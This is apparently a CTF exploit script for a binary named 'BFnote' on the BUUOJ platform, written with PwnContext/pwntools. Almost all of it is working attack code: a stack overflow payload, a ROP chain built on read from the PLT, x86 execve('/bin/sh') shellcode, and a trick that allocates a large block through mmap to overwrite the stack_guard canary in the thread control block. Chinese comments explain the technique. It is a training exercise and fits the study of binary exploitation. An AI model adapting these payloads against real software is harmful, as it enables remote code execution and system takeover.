#! /usr/bin/env python
# -*- coding: utf-8 -*-
from PwnContext.core import *
#-----function for quick script-----#
s       = lambda data               :ctx.send(str(data))        #in case that data is a int
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data))
sl      = lambda data               :ctx.sendline(str(data))
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data))
r       = lambda numb=4096:ctx.recv(numb)
ru      = lambda delims, drop=True:ctx.recvuntil(delims, drop)
irt     = lambda:ctx.interactive()

rs      = lambda*args, **kwargs    :ctx.start(*args, **kwargs)
leak    = lambda address, count=0:ctx.leak(address, count)

uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))

binary = './BFnote'
debug_libc = './libc-2.23.so'
elf = ELF(binary)
libc = ELF(debug_libc)
local = 0


if local == 1 :
    ctx = remote("node3.buuoj.cn","27379")
else:
    ctx.binary = binary
    ctx.remote_libc = debug_libc
    ctx.debug_remote_libc = True
    ctx = ctx.start()

gdb.attach(ctx,'b *0x8048832')

def pwn():
            guess = 0xe160
            postscript = 0x804A060
            got_read = 0x804A010
            plt_read = 0x8048470
            pop_esi_edi_ebp_ret = 0x80489d9
            payload = 'A'*0x32
            payload += 'B'*4+p32(0)+p32(postscript+4)   #canary - ebp - ret
            sa('description : ',payload)
            payload2 = flat(plt_read,pop_esi_edi_ebp_ret,0,p32(got_read),2)
            payload2 += flat(plt_read,postscript+0x50,0x804A000,0x1000,7)
            payload2 = payload2.ljust(0x50,'\x00')
            payload2 += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
            sa('postscript : ',payload2)
            sa('notebook size : ',str(0x20000))   #change canary
            sa('title size : ',0x22000-0x8ec-0x18)   #任意对地址写
            sa('re-enter :',8)
            sa('title : ','1'*8)
            sa('note : ','B'*8)  # 填充tcb中的stack_guard
            ctx.interactive()
            ru('B' * 8)
            s(p16(guess))
            ctx.interactive()

pwn()

# malloc申请内存时，若size大于等 mmap分配阈值（默认值 128KB）0x200000时，malloc会调用mmap申请内存，主要目的是申请一块内存到libc上方靠近tcb
# 寻找stack_guard的方法，search -p 0x5ba0b500(canary)  全局搜索，会找到两个一个是栈上的，一个就是tcb里面的


'''  attack stack_guard
typedef struct {   
void *tcb;        /* Pointer to the TCB.  Not necessarily the thread descriptor used by libpthread.  */   
dtv_t *dtv;   
void *self;       /* Pointer to the thread descriptor.  */   
int multiple_threads;   
int gscope_flag;   
uintptr_t sysinfo;   
uintptr_t stack_guard;   
uintptr_t pointer_guard;   
... } tcbhead_t; 
'''
